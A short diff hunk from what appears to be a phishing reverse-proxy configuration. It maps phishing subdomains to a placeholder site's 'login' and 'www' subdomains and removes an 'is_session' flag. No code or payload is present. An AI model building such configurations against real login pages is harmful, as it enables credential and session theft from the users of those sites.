@@ -7,7 +7,6 @@ proxy_hosts:
     orig_sub:  login
     domain:    example.com
     is_landing: true
-    is_session: true
     auto_filter: true
   - phish_sub: www
     orig_sub:  www
